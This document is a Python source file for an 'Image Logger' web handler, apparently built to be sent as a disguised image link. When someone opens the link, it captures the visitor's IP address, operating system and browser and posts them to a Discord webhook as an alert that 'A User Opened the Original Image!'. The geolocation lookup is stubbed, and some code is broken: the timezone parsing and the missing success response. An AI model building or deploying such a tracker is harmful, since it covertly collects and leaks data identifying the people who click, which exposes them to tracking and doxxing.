import json
import os
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

try:
    # Load configuration from config.json
    config_path = os.path.join(os.path.dirname(__file__), 'config.json')
    with open(config_path, 'r') as config_file:
        config = json.load(config_file)

    # Use environment variables for sensitive information
    config['webhook'] = os.getenv('DISCORD_WEBHOOK')

    if not config['webhook']:
        raise ValueError("DISCORD_WEBHOOK environment variable not set")

except Exception as e:
    print(f"Error loading configuration: {e}")
    raise

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            query = parse.urlsplit(self.path).query
            params = dict(parse.parse_qsl(query))
            useragent = self.headers.get('User-Agent')
            ip = self.client_address[0]
            endpoint = self.path

            # Simulate fetching IP info (replace with actual implementation)
            info = {
                'isp': 'Unknown',
                'as': 'Unknown',
                'country': 'Unknown',
                'regionName': 'Unknown',
                'city': 'Unknown',
                'lat': 'Unknown',
                'lon': 'Unknown',
                'timezone': 'Unknown',
                'mobile': 'Unknown',
                'proxy': 'Unknown',
                'hosting': 'Unknown'
            }
            coords = None

            ping = ""
            if config["antiBot"] == 1:
                ping = ""

            os, browser = httpagentparser.simple_detect(useragent)

            embed = {
                "username": config["username"],
                "content": ping,
                "embeds": [
                    {
                        "title": "Image Logger - IP Logged",
                        "color": config["color"],
                        "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
                        
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
"""
                    }
                ]
            }

            # Send the embed to the webhook
            response = requests.post(config['webhook'], json=embed)
            if response.status_code != 204:
                print(f"Failed to send webhook: {response.status_code} {response.text}")

        except Exception as e:
            print(f"Error handling request: {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Internal Server Error")

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI